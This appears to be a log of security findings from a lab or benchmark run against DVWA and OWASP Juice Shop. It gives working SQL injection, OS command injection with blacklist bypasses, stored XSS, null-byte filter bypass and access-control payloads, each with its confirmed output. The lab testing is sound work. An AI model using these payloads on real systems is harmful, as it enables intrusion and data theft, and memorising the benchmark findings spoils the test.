findings.title: SQL Injection via unsanitized 'id' parameter in DVWA SQLi page [security=low]
findings.response_evidence: [security=low] TRUE payload (id=1' OR '1'='1) returned 5 user records: Surnames 'admin', 'Brown', 'Me', 'Picasso', 'Smith' (First names: admin, Gordon, Hack, Pablo, Bob) — i.e. the entire users table was dumped via boolean bypass of the quoted WHERE clause. FALSE payload (id=1' AND '1'='2) returned zero records (page body contained only 'User ID:' with no pre_blocks / no First name-Surname entries). This TRUE-returns-many / FALSE-returns-none behavioral differential confirms classic string-context SQL injection in the 'id' parameter at low security.

findings.title: OS Command Injection via unsanitized 'ip' parameter in DVWA Command Injection page [security=low]
request_sequence: POST http://dvwa/vulnerabilities/exec/ body: ip=127.0.0.1; whoami&Submit=Submit  (session=dvwa_admin, security=low)
findings.response_evidence: [security=low] Response contained standard ping output for 127.0.0.1 (4 packets, 0% packet loss) immediately followed by the literal string 'www-data' on its own line at the end of the pre_blocks output -- i.e. the injected ';whoami' command executed server-side and returned the web server process's identity (www-data), confirming OS command injection via the 'ip' field with no sanitization of shell metacharacters at low security.

findings.title: Stored Cross-Site Scripting via 'mtxMessage' guestbook field in DVWA XSS (Stored) page [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ body: txtName=qa&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook  (session=dvwa_admin, security=low; client-side maxlength=50 bypassed by submitting raw form field server-side since mtxMessage is 51 chars)
findings.response_evidence: [security=low] After posting the canary payload, the guestbook entry list showed a new 'Name: qa' entry with an empty rendered Message text in the raw HTTP response (expected, since the injected <script> tag itself produces no visible text) indicating the exact unescaped script tag was stored and output. Subsequently navigating to the page with a real browser (Playwright/Chromium) executed the stored script: browser_eval_js('window.xss_flag') returned 1, and browser_read_dom('#test_token') found the element present with inner_text 'window.xss_flag=1', proving the injected <script id="test_token"> tag was stored verbatim and executed in the victim's browser context on page load -- confirming persistent/stored XSS in the mtxMessage field at low security.
findings.browser_js_evidence: window.xss_flag === 1 (evaluated via browser_eval_js after browser_navigate to http://dvwa/vulnerabilities/xss_s/ in dvwa_admin session); browser_read_dom('#test_token') returned inner_text/inner_html_excerpt = "window.xss_flag=1"

findings.title: SQL Injection via numeric boolean payload on id POST field (DVWA medium)
request_sequence: POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} [security=medium]
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} [security=medium]
findings.response_evidence: [security=medium] Confirmed page banner 'Security Level: medium' on both responses. TRUE payload id='1 OR 1=1' returned 5 distinct seeded records: (First name: admin, Surname: admin), (Gordon, Brown), (Hack, Me), (Pablo, Picasso), (Bob, Smith) — i.e. the entire users table was dumped, proving the numeric value is concatenated unescaped into the SQL WHERE clause (quotes are escaped at medium but no input validation/casting is applied to numeric payloads). FALSE payload id='1 AND 1=2' returned zero ID/First name/Surname records (only the User ID selector was present, no pre_blocks). This TRUE/FALSE differential confirms unsanitized SQL injection via the numeric path at medium security.

findings.title: OS Command Injection via pipe bypass on ip POST field (DVWA medium)
request_sequence: POST http://dvwa/vulnerabilities/exec/ with form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'} [security=medium]
findings.response_evidence: [security=medium] Response page confirmed banner 'Security Level: medium'. Submitting ip=127.0.0.1| whoami (pipe, bypassing the medium blacklist which only filters literal ';' and '&&' substrings) produced output containing exactly 'www-data' in the pre_blocks section of the rendered page (visible_text: '... Enter an IP address: www-data More Information ...'; pre_blocks: ['www-data']), proving the whoami command executed server-side and disclosed the web server process identity.

findings.title: Cross-User Basket Access (BOLA) - acct2 can read acct1's basket
request_sequence: GET /rest/basket/6 with juiceshop_acct1 Bearer token -> 200, basket id=6, UserId=22, Product 'Apple Juice (1000ml)' qty=3 (confirms own_basket_id=6 for acct1)

GET /rest/basket/6 with juiceshop_acct2 Bearer token -> 200, returns IDENTICAL basket id=6, UserId=22, Product 'Apple Juice (1000ml)' qty=3 -- acct2's own basket id is 7, yet it retrieved acct1's basket without any ownership check
findings.response_evidence: acct1 request confirms basket 6 belongs to UserId 22 with BasketItem: ProductId 1, name 'Apple Juice (1000ml)', quantity=3. The acct2 request (session_info.own_basket_id=7, email acct2_bench@juiceshop.local) to the SAME endpoint /rest/basket/6 returned HTTP 200 with body identical to acct1's: {\"id\":6,\"UserId\":22,...\"name\":\"Apple Juice (1000ml)\"...\"quantity\":3}. No 403/401 was returned and no ownership filtering was applied server-side, proving acct2 can access acct1's private basket contents (BOLA / CWE-639).

findings.title: Login Authentication-Bypass SQL Injection via email field
findings.response_evidence: Response body: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email payload \"' OR 1=1--\" caused the backend SQL WHERE clause to always evaluate true, returning the first seeded user record (admin@juice-sh.op, bid=1) along with a valid authentication JWT token, despite the arbitrary/incorrect password supplied. This confirms a SQL injection authentication bypass returning a legitimate admin session token.

findings.title: Product-Search SQL Injection (error-based and UNION-based)
findings.response_evidence: First request (q=qwert') returned HTTP 500 with body: 'Error: SQLITE_ERROR: near \"'%'\": syntax error' confirming the single quote broke out of the SQL query and raw database error is exposed. Second request with UNION payload (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) returned HTTP 200 with body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} -- the literal integers 1-9 supplied in the UNION SELECT were reflected directly into the JSON response fields (e.g. name=2, description=3), proving the attacker-controlled UNION SELECT was executed successfully by the backend and its column values returned verbatim, confirming exploitable SQL injection.

findings.title: Open Directory Listing Exposes Confidential Acquisitions Memo via /ftp/
request_sequence:
GET http://juiceshop:3000/ftp/ HTTP/1.1
Accept: text/html,application/json
(unauthenticated session)
findings.response_evidence:
Step 1: GET /ftp/ returned HTTP 200 with a browsable directory listing (content_type text/html) enumerating files including quarantine/, acquisitions.md (909 bytes), announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml — all directly hyperlinked (e.g. http://juiceshop:3000/ftp/acquisitions.md).

Step 2: GET /ftp/acquisitions.md returned HTTP 200, content_type text/markdown, with body containing the confidential memo text:
\"# Planned Acquisitions\n\n> This document is confidential! Do not distribute!\n\nOur company plans to acquire several competitors within the next year.\nThis will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.\"

This matches the benchmark criteria: directory listing is browsable AND reveals acquisitions.md, and direct retrieval of that file discloses the confidential acquisition memo content verbatim, confirming unauthorized exposure of sensitive business information with no authentication required.

findings.title: Exposed Encryption-Keys Directory Listing Discloses premium.key and jwt.pub
findings.response_evidence: GET /encryptionkeys/ returned HTTP 200 with a browsable directory listing (content_type text/html) whose visible text reads: \"listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM\". The listing contains direct hyperlinks to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This satisfies the benchmark criteria: the directory is browsable (HTTP 200) and its listing exposes sensitive key files (premium.key, jwt.pub) without any authentication, constituting an information exposure of cryptographic key material (CWE-548).

findings.title: Poison Null-Byte Path Traversal bypasses file-extension filter on /ftp/ endpoint
findings.response_evidence:
Step 1: GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' (fileServer.js:55 verify middleware), confirming the extension allow-list blocks direct .bak retrieval.
Step 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension) returned HTTP 200 with content_type application/octet-stream and full file content of the restricted package.json.bak file, e.g.:
'{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...} ...}'
This proves the null-byte sequence truncates the filename check after validating the .md extension but the underlying filesystem read (legacy Node C++ null-terminated string handling) retrieves the original .bak file, bypassing the extension filter entirely. Both the 403 on raw path and 200-with-content on bypassed path were demonstrated, satisfying confirmation criteria.

findings.title: Unauthenticated access to /api/Feedbacks discloses user feedback records with PII (partial emails + UserId linkage)
findings.response_evidence:
GET /api/Feedbacks with NO authentication returned HTTP 200 with JSON body containing 8 feedback records. Records include UserId associations (1,2,3,21) linking feedback to specific registered user accounts, and comment text embeds partially-masked but recoverable email address fragments disclosing the author's email domain and trailing characters, e.g.:
- UserId 1: "I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)"
- UserId 2: "Great shop! Awesome service! (***@juice-sh.op)"
- UserId 3: "Nothing useful available here! (***der@juice-sh.op)"
- UserId 21: "Please send me the juicy chatbot NFT in my wallet at /juicy-nft : '<seed phrase>' (***ereum@juice-sh.op)" -- this record additionally leaks what appears to be a cryptocurrency wallet seed phrase.
No authentication token or session cookie was supplied in the request, and the endpoint did not reject the request (no 401/403), confirming this data (user-to-feedback linkage via UserId, partial email PII, and embedded sensitive seed-phrase text) is exposed to anonymous/unauthenticated callers, violating access control expectations (CWE-359).

findings.title: SQL Injection via out-of-band session id input at DVWA high security
findings.response_evidence: [security=high] Page footer confirms 'Security Level: high' on every response. TRUE payload 1' OR '1'='1' # set via session-input.php, then GET /vulnerabilities/sqli/ returned 5 full records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) -- i.e. ALL seeded users dumped, proving the quote-based injection with trailing comment bypasses the appended LIMIT 1 clause. FALSE payload 1' AND '1'='2' # set via session-input.php, then GET /vulnerabilities/sqli/ returned zero <pre> record blocks (page showed only the 'Click here to change your ID' link, no First name/Surname output). This TRUE(multiple rows)/FALSE(zero rows) differential with injected SQL syntax (quote breakout + comment) confirms classic SQL injection at DVWA high security, where id is only accepted out-of-band via session-input.php rather than the GET query string.

findings.title: OS Command Injection via pipe (no trailing space) bypass of blacklist at DVWA high security
findings.response_evidence: [security=high] Response page footer explicitly states 'Security Level: high'. Submitting ip=127.0.0.1|whoami (pipe character immediately followed by command, no space, bypassing the high-level blacklist of '; ', '| ' with trailing space, and '&&') produced visible_text containing 'Enter an IP address: www-data' and a dedicated pre_block entry with exact content 'www-data' -- confirming the piped whoami command executed server-side and returned the web-server process identity, proving OS command injection at DVWA high security.
